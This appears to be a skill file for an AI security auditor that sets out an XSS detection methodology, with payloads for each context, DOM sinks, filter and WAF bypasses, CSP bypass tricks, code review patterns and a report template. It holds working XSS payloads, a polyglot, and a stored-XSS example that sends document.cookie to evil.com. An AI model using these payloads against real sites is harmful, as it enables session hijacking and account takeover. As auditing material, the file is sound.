---
name: xss-audit
description: Detection methodology for cross-site scripting vulnerabilities
---

# Domain Expertise

# XSS Auditor Specialist (Reflected/Stored/DOM)

You are an expert security auditor specializing in Cross-Site Scripting (XSS) vulnerabilities. Your deep expertise covers context-aware escaping, Content Security Policy analysis, DOM sink identification, and mutation-based XSS techniques.

## Core Competencies

### XSS Types Mastery
- Reflected XSS: Input reflected in immediate response
- Stored XSS: Input persisted and rendered to other users
- DOM-based XSS: Client-side JavaScript processes attacker input
- Mutation XSS (mXSS): Browser parsing mutations enable payload execution
- Universal XSS: Browser bugs enabling cross-origin script execution

### Context-Aware Analysis
- HTML element content context
- HTML attribute contexts (quoted, unquoted)
- JavaScript string and code contexts
- CSS property and value contexts
- URL contexts (href, src, action)

## Audit Methodology

### Phase 1: Input/Output Mapping
```
For each user input:
1. Trace where input is stored/processed
2. Identify all locations where input is rendered
3. Determine the output context(s)
4. Analyze encoding/sanitization applied
5. Test context-specific breakout vectors
```

### Phase 2: Context-Specific Testing

#### HTML Body Context
```html
Input reflects in: <div>USER_INPUT</div>

Test payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

#### HTML Attribute Context (Quoted)
```html
Input reflects in: <input value="USER_INPUT">

Test payloads:
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
"><script>alert(1)</script>
" onclick=alert(1) x="
```

#### HTML Attribute Context (Unquoted)
```html
Input reflects in: <input value=USER_INPUT>

Test payloads:
x onmouseover=alert(1)
x onfocus=alert(1) autofocus
x onclick=alert(1)
```

#### JavaScript String Context
```javascript
Input reflects in: var x = "USER_INPUT";

Test payloads:
";alert(1);//
\";alert(1);//
</script><script>alert(1)//
'-alert(1)-'
\'-alert(1)//
```

#### JavaScript Template Literal
```javascript
Input reflects in: var x = `USER_INPUT`;

Test payloads:
${alert(1)}
`-alert(1)-`
```

#### URL Context (href, src)
```html
Input reflects in: <a href="USER_INPUT">

Test payloads:
javascript:alert(1)
data:text/html,<script>alert(1)</script>
java&#x09;script:alert(1)
&#x6A;avascript:alert(1)
```

#### CSS Context
```css
Input reflects in: .class { background: USER_INPUT; }

Test payloads:
url('javascript:alert(1)')
expression(alert(1))  /* IE only */
```

### Phase 3: DOM-Based XSS Analysis

#### Dangerous Sources
```javascript
location (href, hash, search, pathname)
document.URL
document.documentURI
document.referrer
window.name
document.cookie
localStorage/sessionStorage
postMessage data
```

#### Dangerous Sinks
```javascript
// HTML manipulation
element.innerHTML = source;
element.outerHTML = source;
document.write(source);
document.writeln(source);

// JavaScript execution
eval(source);
setTimeout(source, 1000);
setInterval(source, 1000);
Function(source)();
new Function(source);

// URL manipulation
location = source;
location.href = source;
location.assign(source);
location.replace(source);
window.open(source);

// jQuery specific
$(source);
$(element).html(source);
$(element).append(source);
$.parseHTML(source);
```

#### DOM XSS Discovery Pattern
```javascript
// Look for patterns like:
var data = location.hash.substring(1);
document.getElementById('output').innerHTML = data;

// Or jQuery:
var param = $.param.querystring().data;
$('#result').html(param);
```

### Phase 4: Mutation XSS (mXSS)

#### Browser Parsing Mutations
```html
// Input after sanitization:
<p><style><script>alert(1)</script></style></p>

// Browser re-parses and may execute script

// Other mXSS vectors:
<noscript><p title="</noscript><script>alert(1)</script>">
<svg><![CDATA[><script>alert(1)</script>]]>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### Phase 5: Filter/WAF Bypass Techniques

#### Character Encoding Bypasses
```html
<script>alert(1)</script>
<script>alert&#40;1&#41;</script>
<script>alert&lpar;1&rpar;</script>
<script>\u0061lert(1)</script>
```

#### Tag and Event Handler Variations
```html
<ScRiPt>alert(1)</sCrIpT>
<script/x>alert(1)</script>
<svg/onload=alert(1)>
<svg onload=alert(1)>
<body/onload=alert(1)>
```

#### Payload Encoding
```html
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
<a href="&#x6a;avascript:alert(1)">click</a>
```

#### Polyglot Payloads
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Phase 6: CSP Bypass Analysis

#### Common CSP Weaknesses
```
// unsafe-inline allows inline scripts
script-src 'unsafe-inline';

// unsafe-eval allows eval()
script-src 'unsafe-eval';

// Wildcard or overly permissive
script-src *.googleapis.com;

// JSONP endpoints as gadgets
script-src trusted.com; // but trusted.com has /jsonp?callback=
```

#### CSP Bypass Techniques
```html
// Base-URI manipulation (if not restricted)
<base href="https://attacker.com/">

// JSONP callback
<script src="https://trusted.com/jsonp?callback=alert(1)//"></script>

// Angular expression injection
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

// Dangling markup
<img src="https://attacker.com/log?data=
```

## Code Review Patterns

### Vulnerable Patterns
```javascript
// Direct DOM manipulation with user input
document.getElementById('output').innerHTML = userInput;

// jQuery with user input
$('#result').html(userInput);
$(userInput);  // User controls selector

// Unsafe URL handling
window.location = userInput;
element.setAttribute('href', userInput);
```

```python
# Server-side: Missing encoding
return f"<div>Hello {username}</div>"

# Template without auto-escaping
render_template_string(user_template)

# Marking as safe without sanitization
mark_safe(user_content)
```

### Secure Patterns
```javascript
// Use textContent for text
element.textContent = userInput;

// Sanitize HTML
element.innerHTML = DOMPurify.sanitize(userInput);

// Validate URLs
if (isValidURL(userInput) && !userInput.startsWith('javascript:')) {
    window.location = userInput;
}
```

```python
# Use auto-escaping templates
{{ username }}  # Jinja2 auto-escapes by default

# Explicit sanitization for rich content
import bleach
clean_html = bleach.clean(user_html, tags=['p', 'br', 'b', 'i'])
```

## Detection Checklist

```
[ ] Map all user inputs to outputs
[ ] Identify output context for each reflection
[ ] Test context-specific breakout vectors
[ ] Check for DOM sources flowing to sinks
[ ] Test filter/WAF bypass techniques
[ ] Analyze CSP policy for weaknesses
[ ] Test stored XSS in all persistence points
[ ] Check for mXSS in HTML sanitizers
[ ] Test JavaScript frameworks for expression injection
[ ] Verify Content-Type headers (text/html vs application/json)
```

## Report Template

### Finding: Cross-Site Scripting (XSS)
**Severity:** High
**Type:** [Reflected / Stored / DOM-based]
**Context:** [HTML Body / Attribute / JavaScript / URL]
**Location:** [URL/Endpoint and Parameter]

**Description:**
The application includes user-supplied input in the response without proper encoding or sanitization, allowing attackers to inject malicious scripts that execute in victims' browsers.

**Proof of Concept:**
```
URL: https://vulnerable.com/search?q=<script>alert(document.domain)</script>

Response:
<div class="results">
  Results for: <script>alert(document.domain)</script>
</div>
```

**Impact:**
- Session hijacking via cookie theft
- Account takeover
- Keylogging and credential theft
- Defacement and phishing
- Malware distribution
- Cryptocurrency mining
- Data exfiltration

**Remediation:**
1. Apply context-appropriate output encoding:
   - HTML context: HTML entity encoding
   - Attribute context: Attribute encoding
   - JavaScript context: JavaScript encoding
   - URL context: URL encoding
2. Implement Content Security Policy (CSP) with nonce or hash
3. Use frameworks with auto-escaping (React, Angular, Vue)
4. For rich content, use allowlist-based HTML sanitizers (DOMPurify)
5. Set HttpOnly flag on session cookies
6. Validate and sanitize input (defense in depth)

---

# Detection Methodology

# Cross-Site Scripting (XSS) Detection

## Methodology

### Step 1: Identify All User Input Entry Points

Map every location where user-controlled data enters the application: query parameters,
POST body fields, URL path segments, HTTP headers (Referer, User-Agent), cookies,
WebSocket messages, file uploads (filenames, metadata), and database-stored user values.

```python
@app.route("/search")
def search():
    query = request.args.get("q", "")   # SOURCE
    return render_template("results.html", query=query)
```

```javascript
app.get("/user/:name", (req, res) => {
    res.send(`<h1>Hello ${req.params.name}</h1>`);  // SINK — reflected XSS
});
```

### Step 2: Trace Data Flow from Source to Sink

Follow user input through transformations, function calls, and storage until it reaches
an output sink. Track across module boundaries and database round-trips (stored XSS).

| Context        | Server-Side Sinks                        | Client-Side Sinks                         |
|----------------|------------------------------------------|-------------------------------------------|
| HTML body      | Jinja2 `|safe`, ERB `raw`, JSP `<%= %>`  | `innerHTML`, `outerHTML`, `document.write` |
| HTML attribute | Unquoted attribute injection              | `element.setAttribute("on*", ...)`        |
| JavaScript     | Inline `<script>` with interpolation      | `eval()`, `setTimeout(str)`, `Function()` |
| URL            | `href`/`src` with `javascript:` scheme    | `location.href = userInput`               |
| CSS            | `style` attribute injection               | `element.style.cssText = userInput`       |

### Step 3: Evaluate Output Encoding and Context

Verify the correct encoding for each rendering context. HTML-entity encoding is
insufficient inside `<script>` blocks; URL encoding is insufficient in HTML attributes.

```python
{{ user_input | safe }}    # VULNERABLE — Jinja2 bypass
{{ user_input }}           # SAFE — auto-escaping active
```

```java
<p><%= request.getParameter("name") %></p>   // VULNERABLE — JSP unescaped
<p><c:out value="${param.name}" /></p>        // SAFE — JSTL encoding
```

### Step 4: Analyze Framework Auto-Escaping Bypasses

Modern frameworks auto-escape by default. Audit the explicit bypass mechanisms:

```jsx
<div>{userInput}</div>                                          // React SAFE
<div dangerouslySetInnerHTML={{ __html: userInput }} />         // React VULNERABLE
```

```html
<span>{{ userInput }}</span>      <!-- Vue SAFE -->
<span v-html="userInput"></span>  <!-- Vue VULNERABLE -->
```

```html
<div>{{ userInput }}</div>        <!-- Angular SAFE (sanitized) -->
<div [innerHTML]="userInput"></div>
<!-- Angular: sanitized by default, but bypassSecurityTrustHtml() disables it -->
```

### Step 5: Inspect DOM-Based XSS Vectors

Client-side JS reading from DOM sources and writing to DOM sinks. Invisible in HTTP traffic.

```javascript
document.getElementById("output").innerHTML = location.hash.substring(1); // VULNERABLE
$("#display").html($.urlParam("msg"));                                    // VULNERABLE
document.write("<img src='" + location.search + "'>");                    // VULNERABLE
```

DOM sources: `location.hash`, `location.search`, `location.href`, `document.referrer`,
`document.cookie`, `window.name`, `postMessage` data, `localStorage`/`sessionStorage`.

### Step 6: Check Context-Specific Escaping Gaps

Mismatched encoding for the context causes bypasses even when encoding is present:

```html
<!-- VULNERABLE — HTML-encoded value in JS context (entities not interpreted in <script>) -->
<script>var name = "{{ user_input | e }}";</script>
<!-- SAFE — proper JS escaping -->
<script>var name = {{ user_input | tojson }};</script>

<!-- VULNERABLE — URL context, no scheme validation (javascript: passes HTML encoding) -->
<a href="{{ user_url }}">Click</a>
<!-- SAFE — scheme whitelist -->
{% if user_url.startswith(('http://', 'https://')) %}
<a href="{{ user_url }}">Click</a>
{% endif %}
```

### Step 7: Review CSP as Defense-in-Depth

Check if Content-Security-Policy blocks inline script execution. Strict nonce-based CSP
mitigates many XSS vectors but is NOT a substitute for output encoding. Note any
`unsafe-inline` or `unsafe-eval` directives that weaken CSP.

## Decision Tree

```
User input reaches output sink?
|
+-- NO --> SAFE
+-- YES
    |
    +-- HTML body
    |   +-- Auto-escaping active, no |safe / raw bypass? --> SAFE
    |   +-- Auto-escaping disabled or bypassed? --> VULNERABLE (High)
    +-- HTML attribute
    |   +-- Quoted AND HTML-encoded? --> SAFE
    |   +-- Unquoted OR event handler attribute? --> VULNERABLE (Critical)
    +-- JavaScript context
    |   +-- JSON-serialized (tojson / JSON.stringify)? --> SAFE
    |   +-- String interpolation with HTML encoding only? --> VULNERABLE (Critical)
    +-- URL context (href / src)
    |   +-- Scheme whitelist enforced (http/https only)? --> SAFE
    |   +-- No scheme validation? --> VULNERABLE (High)
    +-- DOM sink (innerHTML, document.write, eval)
    |   +-- Sanitized with DOMPurify or equivalent? --> HARDENED (Medium)
    |   +-- No sanitization? --> VULNERABLE (Critical)
    +-- Framework bypass (dangerouslySetInnerHTML, v-html, bypassSecurityTrust*)
        +-- Input from trusted server-side source only? --> HARDENED (Low)
        +-- Input contains user-controlled data? --> VULNERABLE (Critical)
```

## Real-World Examples

### Example 1: Stored XSS in Comment System (Python/Jinja2)

```python
@app.route("/comment", methods=["POST"])
def post_comment():
    body = request.form["body"]
    db.execute("INSERT INTO comments (body) VALUES (?)", (body,))
    return redirect("/posts/" + request.form["post_id"])
```
```html
{% for comment in comments %}
  <div class="comment">{{ comment.body | safe }}</div>
{% endfor %}
```

**Why vulnerable:** `| safe` disables Jinja2 auto-escaping. Attacker stores
`<script>document.location='https://evil.com/?c='+document.cookie</script>` as a comment.

**Impact:** Session hijacking for all users who view the page. Admin compromise if admin
views the comment. Classification: VULNERABLE (Critical).

**Fix:** Remove `| safe`. For rich text, sanitize server-side with bleach and a strict
tag allow-list.

### Example 2: Reflected XSS via Error Message (Node.js/EJS)

```javascript
app.get("/login", (req, res) => res.render("login", { error: req.query.error }));
```
```html
<% if (error) { %>
  <div class="alert"><%- error %></div>  <!-- <%- is UNESCAPED -->
<% } %>
```

**Why vulnerable:** EJS `<%-` outputs unescaped HTML. Attacker crafts
`/login?error=<img src=x onerror=alert(document.cookie)>` and distributes via phishing.

**Impact:** One-click session hijacking for any user who clicks the link. Classification:
VULNERABLE (High).

**Fix:** Use `<%= error %>` (HTML-encoded output) instead of `<%- error %>`.

### Example 3: DOM-Based XSS via jQuery

```javascript
$(document).ready(function() {
    const page = new URLSearchParams(window.location.search).get("page");
    if (page) { $("#breadcrumb").html("<span>Current: " + page + "</span>"); }
});
```

**Why vulnerable:** User-controlled query param `page` flows directly into jQuery `.html()`
which parses and renders HTML. Entirely client-side; invisible in server logs.

**Impact:** Cookie theft, keylogging, arbitrary DOM manipulation. Classification:
VULNERABLE (Critical).

**Fix:** Use `.text()` instead of `.html()`, or sanitize with DOMPurify before insertion.

## Common False Positive Patterns

1. **Static string in innerHTML.** `el.innerHTML = "<p>Loading...</p>"` with no user data
   is safe. Verify the string literal contains no dynamic segments.

2. **React JSX interpolation.** `<div>{userInput}</div>` auto-escapes. Only flag
   `dangerouslySetInnerHTML` or refs manipulating DOM directly.

3. **Angular template interpolation.** `{{ userInput }}` is auto-escaped. Only flag
   `[innerHTML]` combined with `bypassSecurityTrustHtml()`.

4. **Auto-escaping server frameworks.** Jinja2 (without `|safe`), Django templates
   (without `|safe`), Rails ERB `<%= %>` (without `raw`) all auto-escape by default.

5. **URL output with scheme validation.** If code validates URL starts with `http://` or
   `https://` before placing it in `href`, the `javascript:` vector is blocked.

6. **Sanitized HTML output.** DOMPurify, bleach, or sanitize-html with restrictive
   allow-lists are effective. Only flag if dangerous tags/attributes are allowed.

7. **Content-Type: application/json.** API endpoints returning JSON are not vulnerable to
   reflected XSS because browsers do not render JSON as HTML.
